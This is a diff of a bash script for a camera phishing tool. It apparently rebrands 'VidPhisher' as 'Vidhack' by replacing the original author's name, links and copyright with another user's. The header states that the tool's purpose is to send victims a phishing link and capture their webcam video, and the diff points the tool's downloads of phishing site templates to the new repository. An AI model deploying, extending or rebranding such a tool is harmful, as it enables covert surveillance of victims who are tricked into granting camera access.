@@ -1,15 +1,15 @@
 #!/bin/bash
 
-# VidPhisher
+# Vidhack
 # Version    : 1.2
-# Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
+# Description: Vidhack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
+# Author     : qorsan73
+# Github     : https://github.com/qorsan73
+# Email      : mostafaaldby@gmail.com
 # Credits    : TechChipNet, RecordRTC
-# Date       : 05-06-2022
+# Date       : 19-0-2023
 # License    : GPLv3
-# Copyright  : KasRoudra 2022
+# Copyright  : qorsan73 2023
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -85,7 +85,7 @@ patents cannot be used to render the program non-free.
   The precise terms and conditions for copying, distribution and
 modification follow.
 
-Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
+Copyright (C) 2023 qorsan73 (https://github.com/qorsan73)
 LicenseInfo
 
 
@@ -124,7 +124,7 @@ ${cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__|
 ${purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
 ${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
 ${red}                                          [v${version}] 
-${blue}                                  [By KasRoudra] 
+${blue}                                  [By qorsan73] 
 "
 
 loclx_help="
@@ -436,23 +436,23 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/qorsan73/vidhack/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/qorsan73/Vidhack/main/files/changelog.log)
     clear
     echo -e "$logo"
-    echo -e "${info}VidPhisher has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
-        printf "${ask}Do you want to update VidPhisher?${yellow}[y/n] > $green"
+    echo -e "${info}Vidhack has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
+        printf "${ask}Do you want to update Vidhack?${yellow}[y/n] > $green"
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/KasRoudra/VidPhisher
-            echo -e "\n${success}VidPhisher updated successfully!!"
+            cd .. && rm -rf Vidhack Vidhack && git clone https://github.com/qorsan73/Vidhack
+            echo -e "\n${success}Vidhack updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
                 echo -e "$changelog" | head -n4
@@ -581,17 +581,17 @@ fi
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[VidPhisher]
+        echo -e "$red[ToolName]  ${cyan}  :[Vidhack]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Video Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra]
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[qorsan73]
+$red[Github]     ${cyan} :[https://github.com/qorsan73]
+$red[Messenger]  ${cyan} :[https://m.me/qorsan73]
+$red[Email]      ${cyan} :[mostafaaldby@gmail.com]"
         printf "$vp_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
+        xdg-open "https://github.com/qorsan73/qorsan73#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -615,7 +615,7 @@ if [ -e websites.zip ]; then
 fi
 
 if ! [ -d sites ]; then
-    wget -q --show-progress https://github.com/KasRoudra/VidPhisher/releases/latest/download/websites.zip
+    wget -q --show-progress https://github.com/qorsan73/Vidhack/releases/latest/download/websites.zip
     mkdir sites
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
